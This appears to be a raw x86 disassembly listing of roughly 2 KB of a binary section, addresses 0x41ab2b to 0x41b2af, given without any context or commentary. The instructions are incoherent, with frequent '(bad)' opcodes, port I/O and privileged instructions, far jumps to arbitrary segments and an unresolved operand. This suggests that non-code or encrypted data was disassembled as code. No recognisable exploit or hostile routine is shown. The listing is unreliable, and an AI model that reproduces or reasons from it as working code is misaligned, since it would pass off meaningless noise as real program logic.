  41ab2b:	push   0x70
  41ab2d:	arpl   WORD PTR [esi+edx*2+0x37],sp
  41ab31:	scas   eax,DWORD PTR es:[edi]
  41ab32:	loope  0x41ab3d
  41ab34:	cmp    bl,dl
  41ab36:	ss xchg edi,eax
  41ab38:	stos   DWORD PTR es:[edi],eax
  41ab39:	adc    al,0x5d
  41ab3b:	not    DWORD PTR [ecx+0x3ab2fe0f]
  41ab41:	or     eax,0xdda86e9d
  41ab46:	cmp    eax,0x94006964
  41ab4b:	cli    
  41ab4c:	xlat   BYTE PTR ds:[ebx]
  41ab4d:	and    edi,ecx
  41ab4f:	jns    0x41ab7b
  41ab51:	sbb    DWORD PTR [ebx+0xb0712ff],0xffffffa6
  41ab58:	retf   
  41ab59:	stos   DWORD PTR es:[edi],eax
  41ab5a:	sbb    eax,0xe3014598
  41ab5f:	test   eax,0x2eb2fcfd
  41ab64:	push   ecx
  41ab65:	inc    ecx
  41ab66:	jge    0x41ab38
  41ab68:	rcl    BYTE PTR [esi],1
  41ab6a:	and    esi,ecx
  41ab6c:	(bad)  
  41ab6d:	jno    0x41ab17
  41ab6f:	stos   BYTE PTR es:[edi],al
  41ab70:	ins    BYTE PTR es:[edi],dx
  41ab71:	mov    ch,0x3b
  41ab73:	dec    edi
  41ab74:	mov    eax,ds:0x4722d8e8
  41ab79:	pop    ebp
  41ab7a:	mov    edi,0x9f4dadef
  41ab7f:	hlt    
  41ab80:	dec    edi
  41ab81:	and    DWORD PTR [eax-0x51],0x28
  41ab85:	ret    
  41ab86:	test   ecx,eax
  41ab88:	add    BYTE PTR [edi*4-0x7191dba4],dh
  41ab8f:	jmp    FWORD PTR [ecx]
  41ab91:	xchg   edx,eax
  41ab92:	stc    
  41ab93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab94:	cmc    
  41ab95:	hlt    
  41ab96:	dec    DWORD PTR [edi+eax*4-0x6b4759d9]
  41ab9d:	aas    
  41ab9e:	adc    ecx,DWORD PTR [edi]
  41aba0:	pop    ebp
  41aba1:	outs   dx,BYTE PTR ds:[esi]
  41aba2:	jo     0x41ab82
  41aba4:	push   edx
  41aba5:	aas    
  41aba6:	mov    al,ds:0x8606e5a3
  41abab:	mov    WORD PTR [esi+0x8],es
  41abae:	mov    ah,BYTE PTR [ebp+0x1c]
  41abb1:	loope  0x41ac0c
  41abb3:	aaa    
  41abb4:	shl    cl,0x12
  41abb7:	outs   dx,DWORD PTR ds:[esi]
  41abb8:	adc    dl,BYTE PTR [ecx-0x65]
  41abbb:	jecxz  0x41ab56
  41abbd:	aad    0xf
  41abbf:	push   es
  41abc0:	cli    
  41abc1:	mov    ecx,DWORD PTR [ebx-0xf]
  41abc4:	and    al,0x45
  41abc6:	int3   
  41abc7:	les    esi,FWORD PTR [eax+0x2e]
  41abca:	inc    ecx
  41abcb:	jnp    0x41ab5d
  41abcd:	inc    esi
  41abce:	sbb    eax,0x1abff73d
  41abd3:	gs enter 0xc35f,0xdb
  41abd8:	out    0xba,eax
  41abda:	aaa    
  41abdb:	mov    edx,0xc7d6421
  41abe0:	outs   dx,BYTE PTR ds:[esi]
  41abe1:	rol    BYTE PTR [edi+0x79b2a6e7],0x89
  41abe8:	jno    0x41ab77
  41abea:	aam    0xb3
  41abec:	ja     0x41ab94
  41abee:	daa    
  41abef:	stos   BYTE PTR es:[edi],al
  41abf0:	out    0x9f,eax
  41abf2:	sub    al,0xdf
  41abf4:	test   eax,0x2c007b50
  41abf9:	and    BYTE PTR [eax],ch
  41abfb:	popa   
  41abfc:	mov    ebp,0x967f963f
  41ac01:	adc    al,0x13
  41ac03:	mov    DWORD PTR [esi],eax
  41ac05:	mov    ah,0xcd
  41ac07:	mov    al,ds:0x339ed76a
  41ac0c:	in     eax,0x52
  41ac0e:	sar    edx,1
  41ac10:	mov    ecx,0xa6f9f20e
  41ac15:	rol    DWORD PTR [ebx+0x7b],1
  41ac18:	mov    bh,0xa8
  41ac1a:	adc    al,0x8d
  41ac1c:	adc    DWORD PTR [eax],ebx
  41ac1e:	push   esp
  41ac1f:	int    0x1f
  41ac21:	clc    
  41ac22:	jno    0x41ac83
  41ac24:	(bad)  
  41ac25:	nop    DWORD PTR [eax]
  41ac28:	in     eax,0xce
  41ac2a:	cmp    bh,BYTE PTR [edi-0xe]
  41ac2d:	ja     0x41ac58
  41ac2f:	xrelease mov DWORD PTR [esi+0x54beba68],edx
  41ac36:	retf   0x34de
  41ac39:	push   esi
  41ac3a:	data16 sbb ch,al
  41ac3d:	loop   0x41ac59
  41ac3f:	sub    eax,0x1eaae0f7
  41ac44:	cmp    ch,BYTE PTR [ebx]
  41ac46:	push   ebp
  41ac47:	adc    dh,dh
  41ac49:	lahf   
  41ac4a:	jmp    0x5272:0xbeb35c14
  41ac51:	and    ah,bh
  41ac53:	mov    ds:0x63e02521,eax
  41ac58:	jl     0x41ac67
  41ac5a:	mov    eax,0xe669f0c5
  41ac5f:	jns    0x41acd0
  41ac61:	xchg   esi,eax
  41ac62:	xlat   BYTE PTR ds:[ebx]
  41ac63:	fisubr WORD PTR [eax+0x7e02b598]
  41ac69:	mov    al,0x42
  41ac6b:	dec    eax
  41ac6c:	add    DWORD PTR [edx],esi
  41ac6e:	sahf   
  41ac6f:	push   0x4a553df
  41ac74:	or     BYTE PTR [edi],bh
  41ac76:	dec    esi
  41ac77:	sub    al,0x8a
  41ac79:	lods   al,BYTE PTR ds:[esi]
  41ac7a:	call   0x5870:0x7133a5cd
  41ac81:	xor    dl,BYTE PTR [eax+ebp*2-0x669b01ef]
  41ac88:	xor    eax,0x66de9f6b
  41ac8d:	adc    bh,BYTE PTR [esi]
  41ac8f:	retf   0x389c
  41ac92:	sub    al,0x34
  41ac94:	sbb    ah,BYTE PTR [ebp-0x40231497]
  41ac9a:	adc    eax,0x3d5ff475
  41ac9f:	in     eax,dx
  41aca0:	cli    
  41aca1:	in     al,0xcf
  41aca3:	pop    esi
  41aca4:	sbb    DWORD PTR [ecx-0x7b710318],0x1e
  41acab:	xchg   cl,ch
  41acad:	pop    es
  41acae:	cmp    BYTE PTR [edi-0x2ff815f6],ah
  41acb4:	ror    edx,0x72
  41acb7:	jne    0x41acfe
  41acb9:	inc    esp
  41acba:	mov    DWORD PTR [edx+0x8f811e6],eax
  41acc0:	cmc    
  41acc1:	(bad)  
  41acc2:	xor    DWORD PTR [ebx+0x3c690d21],esp
  41acc8:	or     ecx,DWORD PTR [eax-0x56944548]
  41acce:	jp     0x41acf8
  41acd0:	stos   BYTE PTR es:[edi],al
  41acd1:	dec    esp
  41acd2:	leave  
  41acd3:	imul   ebx,esi,0x27
  41acd6:	sub    ah,ch
  41acd8:	and    ax,0x3ebc
  41acdc:	sub    BYTE PTR [edi],cl
  41acde:	test   DWORD PTR [ebx],0xda242bcc
  41ace4:	pop    ebp
  41ace5:	adc    dh,bl
  41ace7:	pop    ds
  41ace8:	xchg   esp,eax
  41ace9:	add    al,0xfe
  41aceb:	test   eax,0xabb94131
  41acf0:	pop    edx
  41acf1:	pushf  
  41acf2:	rcl    DWORD PTR [eax+0x47],1
  41acf5:	jl     0x41ad27
  41acf7:	in     eax,dx
  41acf8:	cwde   
  41acf9:	pop    es
  41acfa:	mov    eax,ds:0x81e6694f
  41acff:	gs jecxz 0x41ad2b
  41ad02:	mov    ah,0x4a
  41ad04:	sbb    esp,esp
  41ad06:	stc    
  41ad07:	test   BYTE PTR [ecx-0x30662b4e],dh
  41ad0d:	mov    eax,ds:0xba057d85
  41ad12:	and    cl,BYTE PTR [esi+0x37f0b600]
  41ad18:	iret   
  41ad19:	adc    ah,BYTE PTR ds:0x5fff7430
  41ad1f:	mov    ch,0x12
  41ad21:	or     bh,BYTE PTR [edi]
  41ad23:	sub    ebx,DWORD PTR [edx+eax*8-0x5b727352]
  41ad2a:	cmp    BYTE PTR [edx],dl
  41ad2c:	(bad)  
  41ad2d:	rol    BYTE PTR [ebx+0x7b],0x64
  41ad31:	cmc    
  41ad32:	add    eax,0xf2b0464d
  41ad37:	and    bh,BYTE PTR [edx+0x65426bdf]
  41ad3d:	dec    esi
  41ad3e:	out    0x1b,eax
  41ad40:	test   DWORD PTR [ebx+0x7],0xb251cc22
  41ad47:	jbe    0x41acd0
  41ad49:	outs   dx,DWORD PTR ds:[esi]
  41ad4a:	into   
  41ad4b:	mov    al,dh
  41ad4d:	out    dx,al
  41ad4e:	or     BYTE PTR [esi],cl
  41ad50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad51:	dec    ebx
  41ad52:	push   0xffffffb9
  41ad54:	push   edi
  41ad55:	dec    ebx
  41ad56:	or     BYTE PTR [esi],dl
  41ad58:	clc    
  41ad59:	lahf   
  41ad5a:	pop    edi
  41ad5b:	mov    al,0x9
  41ad5d:	pop    esp
  41ad5e:	adc    BYTE PTR [ecx+0x3f29a115],0x1
  41ad65:	rep stos BYTE PTR es:[edi],al
  41ad67:	dec    ebx
  41ad68:	mov    ds:0x43096975,al
  41ad6d:	jbe    0x41ad66
  41ad6f:	cdq    
  41ad70:	mov    ebp,DWORD PTR ds:0xe9e80ad3
  41ad76:	cmp    edi,DWORD PTR [ebx]
  41ad78:	pop    edi
  41ad79:	dec    edi
  41ad7a:	push   0x6e7c5e88
  41ad7f:	ret    
  41ad80:	xchg   esi,eax
  41ad81:	push   esi
  41ad82:	popa   
  41ad83:	in     al,0xc
  41ad85:	push   edx
  41ad86:	call   0x446d7b81
  41ad8b:	sbb    eax,0xf014179d
  41ad90:	pop    ebp
  41ad91:	scas   eax,DWORD PTR es:[edi]
  41ad92:	fisub  WORD PTR [edi+0x4b78cfeb]
  41ad98:	fwait
  41ad99:	mov    esi,0x473978e4
  41ad9e:	das    
  41ad9f:	lods   al,BYTE PTR ds:[esi]
  41ada0:	xchg   ebx,eax
  41ada1:	cdq    
  41ada2:	xchg   ebx,eax
  41ada3:	mov    cl,0xf3
  41ada5:	(bad)  
  41ada6:	mov    eax,0x4dce8953
  41adab:	fs jae 0x41adb8
  41adae:	dec    eax
  41adaf:	div    DWORD PTR [edx]
  41adb1:	xchg   edx,eax
  41adb2:	push   edx
  41adb3:	in     eax,dx
  41adb4:	sbb    eax,0x6bed3626
  41adb9:	mov    ch,0xbd
  41adbb:	fdiv   DWORD PTR [esi-0x6f21e2d4]
  41adc1:	push   edi
  41adc2:	mov    cl,0x2a
  41adc4:	test   eax,0x3d5bcb3f
  41adc9:	fwait
  41adca:	pushf  
  41adcb:	dec    edx
  41adcc:	sub    eax,0x44986926
  41add1:	in     al,dx
  41add2:	fwait
  41add3:	sbb    DWORD PTR [edx+0x7aa4ccbe],eax
  41add9:	cmc    
  41adda:	icebp  
  41addb:	es jp  0x41ae4c
  41adde:	dec    edi
  41addf:	lock gs jno 0x41adbe
  41ade3:	stc    
  41ade4:	dec    eax
  41ade5:	loop   0x41ae3f
  41ade7:	adc    bh,cl
  41ade9:	dec    ebx
  41adea:	fst    QWORD PTR [ebp+0xd]
  41aded:	sbb    esi,DWORD PTR [esi]
  41adef:	mov    BYTE PTR [esi+0x71],bl
  41adf2:	sbb    bl,bl
  41adf4:	add    bh,0x3b
  41adf7:	enter  0x75be,0x8a
  41adfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adfc:	(bad)  
  41adfd:	shr    BYTE PTR [esi+0x64204f41],cl
  41ae03:	int    0xfe
  41ae05:	popa   
  41ae06:	add    eax,esi
  41ae08:	add    dh,cl
  41ae0a:	ficomp DWORD PTR ss:[eax]
  41ae0d:	pop    edi
  41ae0e:	outs   dx,DWORD PTR ds:[esi]
  41ae0f:	mov    cl,0xc9
  41ae11:	sub    DWORD PTR [eax+edi*1+0x714f150a],0x2a
  41ae19:	jne    0x41ae36
  41ae1b:	jle    0x41ada9
  41ae1d:	dec    edi
  41ae1e:	lock outs dx,DWORD PTR ds:[esi]
  41ae20:	xchg   esp,eax
  41ae21:	retf   0x3c44
  41ae24:	mov    bh,BYTE PTR [esi]
  41ae26:	in     al,0x43
  41ae28:	retf   0x2fbe
  41ae2b:	dec    esp
  41ae2c:	or     al,0xd9
  41ae2e:	mov    BYTE PTR [ebx-0x16],dh
  41ae31:	clc    
  41ae32:	xor    DWORD PTR [edi-0x6f],ecx
  41ae35:	adc    ch,bl
  41ae37:	jae    0x41ae57
  41ae39:	dec    ebx
  41ae3a:	and    BYTE PTR [edx],bh
  41ae3c:	pop    ecx
  41ae3d:	mov    al,BYTE PTR [ecx+0x3ae77a7f]
  41ae43:	daa    
  41ae44:	setle  BYTE PTR [eax-0x34974ab4]
  41ae4b:	sub    esi,edi
  41ae4d:	sbb    esp,edx
  41ae4f:	xabort 0xc3
  41ae52:	retf   
  41ae53:	in     al,dx
  41ae54:	adc    BYTE PTR [esi+ebx*4-0x1c357d42],dh
  41ae5b:	add    al,0x59
  41ae5d:	mov    BYTE PTR [edx],ch
  41ae5f:	add    eax,0x26117551
  41ae64:	aam    0x3b
  41ae66:	in     al,0xa
  41ae68:	lahf   
  41ae69:	lock test BYTE PTR [edx-0x34bf40d5],dl
  41ae70:	test   eax,0x527fb83
  41ae75:	sbb    eax,0x90c14b0f
  41ae7a:	ss xchg edx,eax
  41ae7c:	fs ret 
  41ae7e:	dec    esi
  41ae7f:	cs loope 0x41aedd
  41ae82:	into   
  41ae83:	out    dx,eax
  41ae84:	cmc    
  41ae85:	xor    DWORD PTR [esi-0x7ce5035c],eax
  41ae8b:	repnz jecxz 0x41ae86
  41ae8e:	sbb    eax,0xd0ccdb97
  41ae93:	repz ficom WORD PTR [esi-0x18775fa9]
  41ae9a:	mov    bh,0xcc
  41ae9c:	pop    esp
  41ae9d:	test   DWORD PTR [edi+0x33],edi
  41aea0:	pop    ss
  41aea1:	aam    0xf6
  41aea3:	xchg   ebp,eax
  41aea4:	and    ecx,DWORD PTR [edx+0x23676f10]
  41aeaa:	mov    ecx,DWORD PTR [esi-0x3965e94b]
  41aeb0:	cmp    BYTE PTR [esi],dh
  41aeb2:	jecxz  0x41aec6
  41aeb4:	ins    DWORD PTR es:[edi],dx
  41aeb5:	sbb    bl,BYTE PTR [ebx+0x6707a2bc]
  41aebb:	inc    eax
  41aebc:	in     al,dx
  41aebd:	sub    al,0x16
  41aebf:	adc    bl,BYTE PTR [ebx]
  41aec1:	xlat   BYTE PTR ds:[ebx]
  41aec2:	mov    cl,0xe4
  41aec4:	xchg   ecx,eax
  41aec5:	dec    edx
  41aec6:	jecxz  0x41aeb2
  41aec8:	ror    edx,1
  41aeca:	icebp  
  41aecb:	cwde   
  41aecc:	dec    esp
  41aecd:	jecxz  0x41aeb2
  41aecf:	mov    bh,0xf9
  41aed1:	push   edx
  41aed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aed3:	pop    ds
  41aed4:	aam    0x33
  41aed6:	cmp    esi,ecx
  41aed8:	mov    cl,0xcb
  41aeda:	mov    ecx,ebx
  41aedc:	mov    ebx,0x750a66f7
  41aee1:	xchg   esp,eax
  41aee2:	aaa    
  41aee3:	aas    
  41aee4:	and    ecx,DWORD PTR [ebx-0x129ac94e]
  41aeea:	sub    al,0xeb
  41aeec:	and    eax,0x87d771ab
  41aef1:	cdq    
  41aef2:	and    BYTE PTR [ebp+0x14],ch
  41aef5:	sti    
  41aef6:	(bad)  
  41aef7:	addr16 jnp 0x41aee3
  41aefa:	mov    es,WORD PTR [esi]
  41aefc:	(bad)  
  41aefd:	push   es
  41aefe:	mov    al,ds:0x8f4cfce0
  41af03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af04:	loopne 0x41af3e
  41af06:	mov    dl,0xfa
  41af08:	sub    edi,eax
  41af0a:	xor    eax,DWORD PTR [ebx-0x7d]
  41af0d:	ds in  al,0x40
  41af10:	icebp  
  41af11:	or     esi,esi
  41af13:	xor    dh,BYTE PTR [ebx-0x19882159]
  41af19:	mov    esp,0x1e77e9e6
  41af1e:	add    ch,bl
  41af20:	daa    
  41af21:	out    0x11,al
  41af23:	mov    esp,0x49fe7452
  41af28:	es repnz and eax,0x4a649cf3
  41af2f:	je     0x41af04
  41af31:	popa   
  41af32:	dec    ebx
  41af33:	fcomp  QWORD PTR [ebp+0x58f45ecd]
  41af39:	ror    BYTE PTR [ebx-0x1d],0x4c
  41af3d:	js     0x41afb7
  41af3f:	push   es
  41af40:	mov    ch,0x5d
  41af42:	and    BYTE PTR es:[edi],al
  41af45:	leave  
  41af46:	loopne 0x41af18
  41af48:	adc    esi,DWORD PTR [ebx+0x440c4b13]
  41af4e:	addr16 sub ch,cl
  41af51:	sbb    DWORD PTR ds:0x7c7e67a6,edi
  41af57:	ja     0x41af5c
  41af59:	and    eax,0xa2bda0eb
  41af5e:	test   eax,0x215cb4d2
  41af63:	lahf   
  41af64:	xchg   ebx,eax
  41af65:	aas    
  41af66:	push   ecx
  41af67:	daa    
  41af68:	push   ds
  41af69:	sar    BYTE PTR [edx-0x753b28bc],0x91
  41af70:	scas   eax,DWORD PTR es:[edi]
  41af71:	out    0x6f,al
  41af73:	sbb    eax,0x76865dd0
  41af78:	scas   eax,DWORD PTR es:[edi]
  41af79:	mov    esp,0xb1b806d3
  41af7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af7f:	xchg   ebp,eax
  41af80:	imul   DWORD PTR [ecx+0x58]
  41af83:	(bad)  
  41af84:	adc    BYTE PTR [edi-0x8],bh
  41af87:	mov    bh,0x62
  41af89:	jne    0x41b005
  41af8b:	pop    edi
  41af8c:	lods   eax,DWORD PTR ds:[esi]
  41af8d:	push   ss
  41af8e:	cs gs test eax,0x5d6650dd
  41af95:	test   DWORD PTR [eax-0x67],esi
  41af98:	fwait
  41af99:	pop    ss
  41af9a:	cdq    
  41af9b:	arpl   si,bx
  41af9d:	repnz aam 0x46
  41afa0:	sti    
  41afa1:	jmp    0xc2385f80
  41afa6:	aam    0x4e
  41afa8:	shl    DWORD PTR [esi-0x19],0x6c
  41afac:	and    esp,DWORD PTR [ebp-0x1b89f5be]
  41afb2:	fs sub ebp,ebx
  41afb5:	daa    
  41afb6:	pop    ecx
  41afb7:	int    0x40
  41afb9:	fiadd  DWORD PTR [edx+0x2e]
  41afbc:	popa   
  41afbd:	out    0x9c,al
  41afbf:	push   edx
  41afc0:	cld    
  41afc1:	xchg   DWORD PTR [edx-0x16],ebp
  41afc4:	fld    DWORD PTR [eax+0x33]
  41afc7:	dec    eax
  41afc8:	push   eax
  41afc9:	pop    ss
  41afca:	ins    DWORD PTR es:[edi],dx
  41afcb:	pop    edi
  41afcc:	push   esi
  41afcd:	int    0xde
  41afcf:	(bad)  es:[ecx+0x75]
  41afd3:	sub    dh,bl
  41afd5:	sar    dh,1
  41afd7:	fcom   QWORD PTR ds:0x471e643b
  41afdd:	jae    0x41b02e
  41afdf:	adc    dh,BYTE PTR [ecx]
  41afe1:	jb     0x41aff8
  41afe3:	or     al,0x6c
  41afe5:	rol    edi,1
  41afe7:	sub    ah,BYTE PTR [edi-0x79119177]
  41afed:	fstp   DWORD PTR ds:0xd78031c
  41aff3:	jb     0x41b03b
  41aff5:	jmp    0x942c:0x4a8a3e89
  41affc:	adc    al,0x53
  41affe:	cmp    eax,0x9a0e942a
  41b003:	call   0xec8dae65
  41b008:	stc    
  41b009:	xor    dh,cl
  41b00b:	es fxch st(4)
  41b00e:	iret   
  41b00f:	inc    edi
  41b010:	mov    bl,0xd4
  41b012:	ds push 0x1cdcb7e2
  41b018:	cmp    al,0xe3
  41b01a:	scas   eax,DWORD PTR es:[edi]
  41b01b:	push   0xfb5b333a
  41b020:	cmc    
  41b021:	push   eax
  41b022:	and    al,0x97
  41b024:	add    BYTE PTR [eax],0xfe
  41b027:	punpckhwd mm1,QWORD PTR [ecx+0xc]
  41b02b:	push   edx
  41b02c:	dec    edx
  41b02d:	mov    ebp,0xb269cba6
  41b032:	fmul   QWORD PTR [ebx-0x3e]
  41b035:	ins    BYTE PTR es:[edi],dx
  41b036:	adc    edi,DWORD PTR [esi-0x52]
  41b039:	xor    DWORD PTR [ebx],ebp
  41b03b:	ja     0x41b04b
  41b03d:	sbb    al,0xc4
  41b03f:	push   ebp
  41b040:	add    bl,ah
  41b042:	in     al,dx
  41b043:	jo     0x41b0bb
  41b045:	push   ds
  41b046:	mov    eax,ds:0xd8de9513
  41b04b:	jmp    0x41b0ae
  41b04d:	xchg   ebp,eax
  41b04e:	sub    esp,eax
  41b050:	out    dx,al
  41b051:	mul    BYTE PTR [ebp+0x6]
  41b054:	cmp    DWORD PTR [esi-0x70],esp
  41b057:	xor    eax,0xa6e5441a
  41b05c:	xor    eax,0xf8d7da89
  41b061:	sbb    eax,0x490887ab
  41b066:	xchg   edx,eax
  41b067:	mov    bh,0x47
  41b069:	int    0xa4
  41b06b:	pop    ss
  41b06c:	sub    ecx,DWORD PTR [edx-0x7f49e57]
  41b072:	outs   dx,BYTE PTR ds:[esi]
  41b073:	jb     0x41b028
  41b075:	aas    
  41b076:	jl     0x41b016
  41b078:	mov    WORD PTR [ebp-0x3252c67],ds
  41b07e:	arpl   WORD PTR [ecx+0x18fa8c38],bx
  41b084:	jmp    0x41b041
  41b086:	test   eax,0x4e29707e
  41b08b:	scas   al,BYTE PTR es:[edi]
  41b08c:	(bad)  
  41b08d:	fsubr  DWORD PTR [ebx+0x6b2fbd94]
  41b093:	repnz aam 0x13
  41b096:	xor    DWORD PTR [esi+0x494fe4fc],ebp
  41b09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b09d:	shl    BYTE PTR [ecx-0x5c8a85f4],0x17
  41b0a4:	mov    ss,WORD PTR [edi+0x1a]
  41b0a7:	daa    
  41b0a8:	test   ecx,ebx
  41b0aa:	pusha  
  41b0ab:	mov    bh,al
  41b0ad:	scas   eax,DWORD PTR es:[edi]
  41b0ae:	dec    ecx
  41b0af:	ins    BYTE PTR es:[edi],dx
  41b0b0:	mov    ebx,?
  41b0b2:	in     eax,0x48
  41b0b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0b5:	mov    bl,0xde
  41b0b7:	(bad)  
  41b0b8:	into   
  41b0b9:	sbb    DWORD PTR [ecx],esp
  41b0bb:	jno    0x41b05b
  41b0bd:	ins    DWORD PTR es:[edi],dx
  41b0be:	xor    al,0xa2
  41b0c0:	jb     0x41b074
  41b0c2:	mov    esi,0xb1e94bac
  41b0c7:	(bad)  
  41b0c8:	pop    ds
  41b0c9:	das    
  41b0ca:	or     al,0xbe
  41b0cc:	adc    ecx,DWORD PTR [edx]
  41b0ce:	ds dec esi
  41b0d0:	sahf   
  41b0d1:	ja     0x41b140
  41b0d3:	jmp    0x41b07a
  41b0d5:	mov    ch,0x42
  41b0d7:	mov    eax,0x801b7935
  41b0dc:	fldln2 
  41b0de:	(bad)  
  41b0df:	pushf  
  41b0e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0e1:	mov    esi,0x7b28099
  41b0e6:	and    eax,0xf6a69f97
  41b0eb:	cmp    eax,0xc51856bc
  41b0f0:	xchg   esp,eax
  41b0f1:	xchg   BYTE PTR [ebx-0x7a499577],ah
  41b0f7:	outs   dx,BYTE PTR ds:[si]
  41b0f9:	cmc    
  41b0fa:	and    ebx,DWORD PTR [eax+0x4a1bd416]
  41b100:	sub    eax,0xf91b6b25
  41b105:	mov    ch,0x42
  41b107:	jle    0x41b157
  41b109:	pusha  
  41b10a:	ins    BYTE PTR es:[edi],dx
  41b10b:	imul   edx,DWORD PTR [edi+0x24],0x876cc830
  41b112:	pusha  
  41b113:	imul   eax,DWORD PTR [esi-0x4ea7eb6f],0x1e
  41b11a:	int3   
  41b11b:	jbe    0x41b138
  41b11d:	xor    BYTE PTR ds:0x990de04,bl
  41b123:	iret   
  41b124:	dec    edi
  41b125:	mov    ch,dl
  41b127:	fnstenv [edx-0x50d2147f]
  41b12d:	stc    
  41b12e:	sbb    BYTE PTR ss:[ebx],0x67
  41b132:	mov    ah,0x11
  41b134:	addr16 jmp 0x633a:0x6825af13
  41b13c:	cwde   
  41b13d:	stc    
  41b13e:	in     al,0x1f
  41b140:	inc    ebx
  41b141:	push   esp
  41b142:	sub    al,0x66
  41b144:	cdq    
  41b145:	out    dx,eax
  41b146:	call   0xb36840ca
  41b14b:	stos   DWORD PTR es:[edi],eax
  41b14c:	mov    esi,0xf2bef667
  41b151:	scas   al,BYTE PTR es:[edi]
  41b152:	mov    dl,0x4f
  41b154:	cmc    
  41b155:	push   ebx
  41b156:	test   WORD PTR [ebx+0x75],di
  41b15a:	call   esi
  41b15c:	jl     0x41b1d1
  41b15e:	stc    
  41b15f:	out    0xd5,eax
  41b161:	sbb    al,0x86
  41b163:	fldcw  WORD PTR [edi+0x475b96f8]
  41b169:	aad    0x94
  41b16b:	ins    DWORD PTR es:[edi],dx
  41b16c:	xor    eax,ecx
  41b16e:	das    
  41b16f:	jmp    0x3b59c254
  41b174:	fnstenv [edi-0x67]
  41b177:	das    
  41b178:	mov    ch,0xfb
  41b17a:	xchg   edi,eax
  41b17b:	cmp    DWORD PTR [ebp-0x34],esi
  41b17e:	xor    ah,BYTE PTR [ebx+0xaf2db67]
  41b184:	popa   
  41b185:	repnz mov bl,0x18
  41b188:	xchg   ecx,eax
  41b189:	pop    esp
  41b18a:	xor    DWORD PTR [ebx+0x4],ecx
  41b18d:	(bad)  
  41b18e:	pop    ss
  41b18f:	les    esi,FWORD PTR [ebp+0x57957863]
  41b195:	add    BYTE PTR [edx-0x3dfe5331],dh
  41b19b:	push   ecx
  41b19c:	out    dx,al
  41b19d:	mov    BYTE PTR [edi],cl
  41b19f:	popf   
  41b1a0:	add    eax,0x126c3218
  41b1a5:	vpavgb ymm6,ymm6,YMMWORD PTR [ecx+0x73]
  41b1aa:	lds    esp,FWORD PTR [edx]
  41b1ac:	cwde   
  41b1ad:	addr16 ret 
  41b1af:	popf   
  41b1b0:	js     0x41b148
  41b1b2:	pusha  
  41b1b3:	xchg   edx,eax
  41b1b4:	sbb    esp,ecx
  41b1b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1b7:	dec    esp
  41b1b8:	in     eax,dx
  41b1b9:	sub    ebx,DWORD PTR [eax+eiz*1-0xd33fa34]
  41b1c0:	inc    esi
  41b1c1:	inc    ebp
  41b1c2:	pop    eax
  41b1c3:	cmp    ch,BYTE PTR [edx-0x4f]
  41b1c6:	test   DWORD PTR [esi],eax
  41b1c8:	fidivr DWORD PTR [edi-0x59]
  41b1cb:	fwait
  41b1cc:	cmc    
  41b1cd:	int3   
  41b1ce:	mov    al,0xb2
  41b1d0:	pop    esi
  41b1d1:	adc    al,0x6e
  41b1d3:	repz add BYTE PTR [esi-0x560cc9b0],0x3e
  41b1db:	xchg   DWORD PTR [ebx+0x477c220],ebp
  41b1e1:	xchg   ebx,eax
  41b1e2:	ret    0xe966
  41b1e5:	push   0x8b3aebac
  41b1ea:	add    eax,eax
  41b1ec:	loopne 0x41b184
  41b1ee:	fst    st(6)
  41b1f0:	or     ah,BYTE PTR [edx+0x61]
  41b1f3:	fidivr DWORD PTR [esi]
  41b1f5:	mov    fs,WORD PTR [esp+edx*4-0x3f]
  41b1f9:	mov    ecx,0x9d932d92
  41b1fe:	outs   dx,DWORD PTR ds:[esi]
  41b1ff:	mov    ecx,0x266f9b71
  41b204:	jmp    0xa97bfeef
  41b209:	dec    DWORD PTR [eax-0x5e2c4447]
  41b20f:	test   eax,0xeaf0610
  41b214:	fs (bad) 
  41b216:	fwait
  41b217:	jg     0x41b275
  41b219:	vpaddd ymm2,ymm3,YMMWORD PTR [ecx]
  41b21d:	popa   
  41b21e:	push   0xffffffe9
  41b220:	out    dx,eax
  41b221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b222:	imul   esi,esi,0xd69442d1
  41b228:	xchg   BYTE PTR cs:[esi],cl
  41b22b:	shl    ebx,1
  41b22d:	jo     0x41b24d
  41b22f:	xor    esi,ebp
  41b231:	push   es
  41b232:	cmp    cl,BYTE PTR [ebx-0x71d52201]
  41b238:	cmp    DWORD PTR [ecx],ebp
  41b23a:	sbb    al,0x2c
  41b23c:	test   ah,ch
  41b23e:	mov    ah,0xb9
  41b240:	sbb    DWORD PTR [eax],esp
  41b242:	imul   dl
  41b244:	and    edi,DWORD PTR [ebx+0x18]
  41b247:	jno    0x41b1da
  41b249:	pop    esp
  41b24a:	nop
  41b24b:	test   BYTE PTR [edx+0xe8c47e7],ah
  41b251:	fst    QWORD PTR [edi-0x7135676e]
  41b257:	pop    esi
  41b258:	call   0x28d34284
  41b25d:	add    al,0x38
  41b25f:	int3   
  41b260:	cmp    DWORD PTR [ebp+0x2f0884f6],0x39026b77
  41b26a:	ins    DWORD PTR es:[edi],dx
  41b26b:	jecxz  0x41b2cd
  41b26d:	dec    edx
  41b26e:	inc    ebx
  41b26f:	mov    dl,0x38
  41b271:	mov    BYTE PTR [edx-0x9827cc0],bh
  41b277:	loope  0x41b221
  41b279:	adc    eax,DWORD PTR [esi-0x387b5a6c]
  41b27f:	sub    eax,0x47b43db1
  41b284:	mov    ch,BYTE PTR [eax]
  41b286:	xchg   esi,eax
  41b287:	std    
  41b288:	mov    ah,0x8
  41b28a:	in     eax,0xe0
  41b28c:	fild   WORD PTR [eax-0x33]
  41b28f:	mov    ds:0x236943c,al
  41b294:	add    edx,DWORD PTR [ebp+0x53989282]
  41b29a:	mov    BYTE PTR [ebx+ecx*4],0xc2
  41b29e:	leave  
  41b29f:	fnsave ds:0x62642710
  41b2a5:	xchg   edx,eax
  41b2a6:	cwde   
  41b2a7:	imul   edi,DWORD PTR [ebx-0x55],0xedfdf23b
  41b2ae:	(bad)  
  41b2af:	sub    dl,bl
